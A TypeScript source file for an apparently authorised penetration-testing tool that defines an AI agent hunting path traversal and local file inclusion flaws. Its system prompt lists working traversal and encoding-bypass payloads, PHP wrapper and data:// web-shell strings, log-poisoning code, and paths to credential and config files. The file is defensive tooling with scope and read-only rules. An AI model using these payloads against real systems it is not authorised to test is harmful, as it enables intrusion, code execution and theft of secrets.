/**
 * Path Traversal Hunter Agent
 *
 * Specialized agent for detecting path traversal and Local File Inclusion (LFI)
 * vulnerabilities. Uses the ReAct loop engine to systematically discover directory
 * traversal, encoding bypass, PHP wrapper exploitation, and LFI-to-RCE chains
 * across in-scope targets.
 */

import type { ModelProvider } from '../core/providers/types';
import type {
  BaseAgent,
  AgentTask,
  AgentResult,
  AgentFinding,
  AgentStatus,
  AgentMetadata,
} from './base_agent';
import { generateFindingId } from './base_agent';
import { registerAgent } from './agent_catalog';
import { ReactLoop } from '../core/engine/react_loop';
import type {
  ReactLoopConfig,
  CommandResult,
  ReactFinding,
} from '../core/engine/react_loop';
import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';
import type { HttpClient } from '../core/http/request_engine';

const PATH_TRAVERSAL_SYSTEM_PROMPT = `You are an expert path traversal and Local File Inclusion (LFI) security researcher with deep knowledge of filesystem path handling, URL encoding schemes, web server path normalization, PHP wrappers, and LFI-to-RCE exploitation chains. You specialize in finding path traversal and LFI vulnerabilities across diverse web application stacks.

Your attack playbook — follow these steps methodically:

1. **Identify traversal surfaces** — Find parameters that reference files or paths: file, path, page, include, template, doc, download, img, src, href, url, document, folder, dir, filepath, filename, attachment, resource, load, read, view, content, lang, locale, theme, style, module, plugin, action, controller. Focus on: file download/view endpoints, template rendering, static asset serving, PDF/report generation, language/locale selection, image serving, file preview functionality.

2. **Basic traversal probes** — Test each parameter:
   - \`../../../etc/passwd\`
   - \`..\\..\\..\\..\\Windows\\win.ini\`
   - Increasing depth: \`../\`, \`../../\`, \`../../../\` ... up to \`../../../../../../..\`
   - Both forward slash (/) and backslash (\\) variants
   - Check response for file contents (root:x:0:0:, [fonts], [extensions])
   - Compare response length and content against baseline request

3. **Path canonicalization bypass** — When basic traversal is filtered:
   - Double encoding: \`%252e%252e%252f\` (server double-decodes %25 -> % then %2e -> .)
   - URL encoding: \`%2e%2e%2f\` or \`%2e%2e/\` or \`..%2f\`
   - UTF-8 overlong encoding: \`%c0%ae%c0%ae%c0%af\` (some Java parsers accept this)
   - Mixed separators: \`..\\/\`, \`..\\\\//\`, \`.\\.\\.\\/\`
   - Null byte: \`../../../etc/passwd%00.jpg\` (PHP < 5.3.4 truncates at null byte)
   - Dot-dot-semicolon (Nginx/Tomcat path normalization): \`/..;/..;/etc/passwd\`
   - Double dot segments: \`....//....//etc/passwd\` (filter removes first \`../\` leaving \`../\`)
   - URL-encoded null byte: \`%00\` appended before expected extension
   - Backslash on Windows: \`..\\..\\..\\etc/passwd\`

4. **OS-specific target files** — Choose PoC files that prove traversal without exposing sensitive data:
   - Linux: \`/etc/passwd\`, \`/etc/hostname\`, \`/etc/os-release\`, \`/proc/self/environ\`, \`/proc/version\`
   - Windows: \`C:\\Windows\\win.ini\`, \`C:\\Windows\\System32\\drivers\\etc\\hosts\`, \`C:\\Windows\\System32\\license.rtf\`
   - Java: \`WEB-INF/web.xml\`, \`META-INF/MANIFEST.MF\`
   - Application config: \`.env\`, \`config.php\`, \`settings.py\`, \`application.yml\`, \`application.properties\`

5. **Absolute path injection** — Some parameters accept absolute paths directly:
   - \`/etc/passwd\` (no traversal needed, just absolute path)
   - \`file:///etc/passwd\` (URL scheme injection)
   - \`C:\\Windows\\win.ini\` (Windows absolute path)
   - Test with and without path prefixes the application may prepend

6. **PHP wrapper exploitation** (if PHP detected via headers, extensions, or error messages):
   - \`php://filter/convert.base64-encode/resource=index.php\` — read source code as base64
   - \`php://filter/convert.base64-encode/resource=config.php\` — read config files
   - \`php://filter/read=string.rot13/resource=index.php\` — alternative filter
   - \`php://input\` with POST body containing PHP code — requires allow_url_include=On
   - \`data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==\` — data wrapper with PHP code
   - PHP filter chain RCE (no allow_url_include needed) — chain multiple filters to generate arbitrary content
   - \`expect://id\` — requires expect module (rare but powerful)

7. **LFI-to-RCE escalation chains** — When LFI is confirmed, attempt to escalate:
   - Log poisoning: Inject \`<?php system($_GET['c']); ?>\` via User-Agent header, then include \`/var/log/apache2/access.log\` or \`/var/log/nginx/access.log\` or \`/var/log/httpd/access_log\`
   - Session file inclusion: \`/tmp/sess_<PHPSESSID>\` with PHP code injected into session data
   - \`/proc/self/environ\` inclusion (contains HTTP_USER_AGENT with injected PHP code)
   - \`/proc/self/fd/N\` — file descriptors may point to accessible log files
   - Temporary file race condition: upload a file, include it before cleanup

8. **Framework-specific paths** — Target known config locations:
   - Spring Boot: \`/actuator/env\`, \`application.properties\`, \`application.yml\`, \`bootstrap.yml\`
   - Django: \`settings.py\`, \`manage.py\`, \`urls.py\`
   - Rails: \`config/database.yml\`, \`config/secrets.yml\`, \`config/credentials.yml.enc\`
   - Node.js: \`package.json\`, \`.env\`, \`config.js\`, \`config/default.json\`
   - Java: \`WEB-INF/web.xml\`, \`WEB-INF/classes/\`, \`META-INF/context.xml\`
   - Laravel: \`.env\`, \`config/app.php\`, \`config/database.php\`, \`storage/logs/laravel.log\`
   - WordPress: \`wp-config.php\`, \`wp-includes/version.php\`

9. **Distinguishing path traversal from other vulns** — Ensure correct classification:
   - Path traversal = reading LOCAL files from the SERVER filesystem
   - SSRF = making the SERVER request REMOTE URLs (use http:// URLs to test)
   - Open redirect = redirecting the CLIENT to external URLs (3xx response)
   - Confirm by checking if response contains actual file contents vs HTTP redirect vs proxied response
   - Verify by reading multiple different local files — consistent success confirms LFI

10. **Validation** — For each candidate finding:
    - Confirm file content matches expected format for the target file (e.g., /etc/passwd has colon-delimited fields)
    - Test with at least two different target files to confirm consistent traversal
    - Document the exact path payload that works, including any encoding
    - Document the traversal depth required (how many ../ needed)
    - Assess impact: which files are readable, can reach sensitive config/credentials, can escalate to RCE
    - If LFI-to-RCE is possible, document the full chain but DO NOT execute arbitrary commands

IMPORTANT RULES:
- Only test targets that are explicitly in scope
- Never attempt to write files — read only. LFI-to-RCE chains should be documented but not fully exploited
- Use benign PoC files (/etc/passwd, win.ini, /etc/hostname) — never target credentials or key files directly for exfiltration
- Document traversal depth, encoding method, and any filters/WAF bypasses required
- Report whether the traversal is relative (../) or absolute path injection
- Use appropriate delays between requests to avoid overwhelming targets`;

export class PathTraversalHunterAgent implements BaseAgent {
  readonly metadata: AgentMetadata = {
    id: 'path-traversal-hunter',
    name: 'Path Traversal Hunter',
    description:
      'Specialized agent for detecting path traversal and Local File Inclusion (LFI) vulnerabilities with encoding bypass, PHP wrapper exploitation, and LFI-to-RCE chain detection.',
    vulnerabilityClasses: ['path_traversal', 'lfi', 'lfi_rce'],
    assetTypes: ['web-application', 'api', 'file-upload'],
  };

  private provider?: ModelProvider;
  private model?: string;
  private findings: AgentFinding[] = [];
  private status: AgentStatus;
  private autoApproveSafe = false;
  private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
  private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;

  constructor() {
    this.status = {
      agentId: this.metadata.id,
      agentName: this.metadata.name,
      status: 'idle',
      toolsExecuted: 0,
      findingsCount: 0,
      lastUpdate: Date.now(),
    };
  }

  /** Set callbacks for approval and command execution */
  setCallbacks(callbacks: {
    onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
    onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
    autoApproveSafe?: boolean;
  }): void {
    this.onApprovalRequest = callbacks.onApprovalRequest;
    this.onExecuteCommand = callbacks.onExecuteCommand;
    if (callbacks.autoApproveSafe !== undefined) {
      this.autoApproveSafe = callbacks.autoApproveSafe;
    }
  }

  async initialize(provider: ModelProvider, model: string): Promise<void> {
    this.provider = provider;
    this.model = model;
    this.findings = [];
    this.updateStatus('initializing');
  }

  async execute(task: AgentTask): Promise<AgentResult> {
    const startTime = Date.now();
    this.findings = [];
    this.updateStatus('running', task.description);

    if (!this.provider || !this.model) {
      throw new Error('Agent not initialized — call initialize() first');
    }

    try {
      const loop = new ReactLoop({
        provider: this.provider,
        model: this.model,
        systemPrompt: PATH_TRAVERSAL_SYSTEM_PROMPT,
        goal: `Test for path traversal and Local File Inclusion (LFI) vulnerabilities on target: ${task.target}\n\nScope: ${task.scope.join(', ')}\n\n${task.description}`,
        tools: AGENT_TOOL_SCHEMAS,
        maxIterations: 30,
        target: task.target,
        scope: task.scope,
        autoApproveSafe: this.autoApproveSafe,
        onApprovalRequest: this.onApprovalRequest,
        onExecuteCommand: this.onExecuteCommand,
        onFinding: (finding) => {
          this.findings.push(this.convertFinding(finding));
          this.status.findingsCount = this.findings.length;
        },
        onStatusUpdate: (update) => {
          this.status.toolsExecuted = update.toolCallCount;
          this.status.lastUpdate = Date.now();
        },
        httpClient: task.parameters.httpClient as HttpClient | undefined,
        availableTools: task.parameters.availableTools as string[] | undefined,
      });

      const result = await loop.execute();

      // Convert any remaining findings from the loop
      for (const finding of result.findings) {
        if (!this.findings.some(f => f.id === finding.id)) {
          this.findings.push(this.convertFinding(finding));
        }
      }

      this.updateStatus(result.success ? 'completed' : 'failed');

      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: result.success,
        findings: this.findings,
        toolsExecuted: result.toolCallCount,
        duration: Date.now() - startTime,
        error: result.success ? undefined : (result.summary || `Agent stopped: ${result.stopReason}`),
      };
    } catch (error) {
      this.updateStatus('failed');
      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: false,
        findings: this.findings,
        toolsExecuted: this.status.toolsExecuted,
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  validate(target: string): boolean {
    try {
      new URL(target.startsWith('http') ? target : `https://${target}`);
      return true;
    } catch {
      return false;
    }
  }

  reportFindings(): AgentFinding[] {
    return [...this.findings];
  }

  async cleanup(): Promise<void> {
    this.findings = [];
    this.updateStatus('idle');
  }

  getStatus(): AgentStatus {
    return { ...this.status };
  }

  private convertFinding(finding: ReactFinding): AgentFinding {
    return {
      id: finding.id || generateFindingId(),
      agentId: this.metadata.id,
      type: finding.vulnerabilityType,
      title: finding.title,
      severity: finding.severity,
      description: finding.description,
      target: finding.target,
      evidence: finding.evidence,
      reproduction: finding.reproductionSteps,
      timestamp: new Date(),
    };
  }

  private updateStatus(status: AgentStatus['status'], currentTask?: string): void {
    this.status.status = status;
    this.status.lastUpdate = Date.now();
    if (currentTask !== undefined) {
      this.status.currentTask = currentTask;
    }
  }
}

// Register in catalog
registerAgent({
  metadata: new PathTraversalHunterAgent().metadata,
  factory: () => new PathTraversalHunterAgent(),
});

export default PathTraversalHunterAgent;
